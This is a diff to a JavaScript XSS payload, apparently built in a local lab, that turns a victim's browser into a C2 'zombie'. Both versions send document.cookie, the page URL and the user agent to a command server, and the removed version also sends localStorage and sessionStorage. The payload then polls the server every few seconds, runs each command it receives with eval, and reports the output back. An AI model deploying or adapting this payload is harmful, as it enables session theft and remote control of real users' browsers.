@@ -1,119 +1,124 @@
-// XSS 載荷 - 建立與 C2 伺服器的連接
-(function () {
-    'use strict';
+// ==================== first_payload.js (完整正確版) ====================
 
-    // C2 伺服器配置
-    const C2_SERVER = 'http://127.0.0.1:8964'; // 修正端口為 8964
-    const REGISTER_URL = C2_SERVER + '/api/control/add_message';
-    const COMMAND_URL = C2_SERVER + '/api/control/get_command';
-
-    // 收集目標資訊
-    const targetInfo = {
-        ip: window.location.hostname,
-        url: window.location.href,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage)
+const C2_SERVER = 'http://127.0.0.1:8964';
+const C2_CONTROL_API = "/api/control/add_message";
+const C2_GET_COMMAND_API = "/api/control/get_command";
+const C2_SEND_RESULT_API = "/api/control/send_result";
+// 這是你丟失的 register 函數！
+async function register() {
+    const data = new FormData();
+    const target_info = {
+        where: window.location.href,
+        hostname: window.location.hostname,
+        cookie: document.cookie,
+        user_agent: navigator.userAgent,
+        time_stamp: new Date().toISOString()
     };
-
-    console.log('[C2] 載荷已載入，目標資訊:', targetInfo);
-
-    // 註冊殭屍機器到 C2 伺服器
-    function registerZombie() {
-        try {
-            // 使用 FormData 格式，符合後端期望
-            const formData = new FormData();
-            formData.append('message', `殭屍機器上線: ${targetInfo.userAgent}`);
-            formData.append('target_ip', targetInfo.ip);
-
-            fetch(REGISTER_URL, {
-                method: 'POST',
-                body: formData,
-                mode: 'cors'
-            })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('[C2] 成功註冊到 C2 伺服器');
-                        return response.json();
-                    } else {
-                        throw new Error('註冊失敗: ' + response.status);
-                    }
-                })
-                .then(data => {
-                    console.log('[C2] 註冊響應:', data);
-                })
-                .catch(error => {
-                    console.error('[C2] 註冊錯誤:', error);
-                    // 如果 5000 端口失敗，嘗試 8964
-                    tryAlternativePort();
-                });
-        } catch (error) {
-            console.error('[C2] 註冊異常:', error);
-        }
-    }
-
-    // 嘗試替代端口
-    function tryAlternativePort() {
-        const altFormData = new FormData();
-        altFormData.append('message', `殭屍機器上線 (alt port): ${targetInfo.userAgent}`);
-        altFormData.append('target_ip', targetInfo.ip);
-
-        fetch('http://127.0.0.1:8964/api/control/add_message', {
+    data.append("message", JSON.stringify(target_info));
+    data.append("target_ip", window.location.hostname);
+    try {
+        const response = await fetch(`${C2_SERVER}${C2_CONTROL_API}`, {
             method: 'POST',
-            body: altFormData,
-            mode: 'cors'
-        })
-            .then(response => {
-                if (response.ok) {
-                    console.log('[C2] 通過替代端口 8964 成功註冊');
-                    // 更新 C2 伺服器配置為 8964
-                    window.C2_SERVER = 'http://127.0.0.1:8964';
-                }
-            })
-            .catch(error => {
-                console.error('[C2] 替代端口也失敗:', error);
-            });
+            body: data
+        });
+        if (response.ok) {
+            console.log("C2註冊成功", response.status);
+        } else {
+            console.error("C2註冊失敗", response.status);
+        }
+    } catch (error) {
+        console.error("C2註冊失敗", error);
     }
+}
 
-    // 獲取並執行命令
-    function getCommand() {
-        const currentServer = window.C2_SERVER || C2_SERVER;
-        const cmdUrl = currentServer + '/api/control/get_command?zombie_ip=' + targetInfo.ip;
+// 這是唯一的、正確的 get_command 函數！
+async function get_command() {
+    try {
+        const command_path = `${C2_SERVER}${C2_GET_COMMAND_API}?zombie_ip=${window.location.hostname}`;
+        const response = await fetch(command_path);
 
-        fetch(cmdUrl, {
-            method: 'GET',
-            mode: 'cors'
-        })
-            .then(response => response.json())
-            .then(data => {
-                if (data.data && data.data !== '沒有命令') {
-                    console.log('[C2] 收到命令:', data.data);
-                    try {
-                        // 安全執行命令
-                        eval(data.data);
-                    } catch (error) {
-                        console.error('[C2] 命令執行錯誤:', error);
-                    }
-                }
-            })
-            .catch(error => {
-                console.error('[C2] 獲取命令錯誤:', error);
-            });
+        if (!response.ok) {
+            throw new Error(`伺服器錯誤: ${response.status}`);
+        }
+
+        return await response.json();
+    } catch (error) {
+        console.error("get_command 內部錯誤:", error);
+        throw error; // 向上拋出，讓調用者知道出錯了
     }
+}
 
-    // 啟動載荷
-    console.log('[C2] 載荷啟動中...');
+// 修正後的 send_result 函數 - 使用正確的 API 和字段
+async function send_result(result) {
+    try {
+        const data = new FormData();
+        // 使用 'result' 字段，而不是 'message'
+        data.append("result", JSON.stringify(result));
 
-    // 延遲 2 秒後註冊（避免頁面載入衝突）
-    setTimeout(registerZombie, 2000);
+        // 使用專門的 send_result API
+        const response = await fetch(`${C2_SERVER}${C2_SEND_RESULT_API}`, {
+            method: 'POST',
+            body: data
+        });
 
-    // 每 10 秒檢查一次命令
-    setInterval(getCommand, 10000);
+        if (response.ok) {
+            console.log("結果發送成功", response.status);
+        } else {
+            console.error("結果發送失敗", response.status);
+        }
+    } catch (error) {
+        console.error("發送結果時發生錯誤:", error);
+    }
+}
 
-    // 也嘗試立即檢查命令
-    setTimeout(getCommand, 5000);
+// 這是唯一的、正確的 execute_command 函數！
+async function execute_command() {
+    try {
+        const command_data = await get_command();
 
-    console.log('[C2] 載荷設置完成');
-})();
+        // 用 'data' 來開箱！
+        if (command_data && command_data.data && command_data.data !== '沒有命令') {
+            console.log("收到並執行命令:", command_data.data);
+
+            let execution_result = {
+                command: command_data.data,
+                timestamp: new Date().toISOString(),
+                success: false,
+                output: null,
+                error: null
+            };
+
+            try {
+                // 捕獲 eval 的執行結果
+                const result = eval(command_data.data);
+                execution_result.success = true;
+                execution_result.output = result !== undefined ? String(result) : "命令執行成功，無返回值";
+            } catch (evalError) {
+                execution_result.success = false;
+                execution_result.error = String(evalError);
+                console.error("命令執行失敗:", evalError);
+            }
+
+            // 發送執行結果
+            await send_result(execution_result);
+        } else {
+            console.log("無新命令...");
+        }
+    } catch (error) {
+        console.error("execute_command 執行鏈路失敗:", error);
+        // 即使在獲取命令時失敗，也發送錯誤報告
+        await send_result({
+            command: "GET_COMMAND_ERROR",
+            timestamp: new Date().toISOString(),
+            success: false,
+            error: String(error)
+        });
+    }
+}
+
+// --- 主程序入口 ---
+console.log("Payload V3.1 已載入，開始註冊並啟動心跳...");
+register();
+setInterval(execute_command, 5000); // 把間隔改長一點，5秒，別把你自己的伺服器DDoS了
+
+// =======================================================================
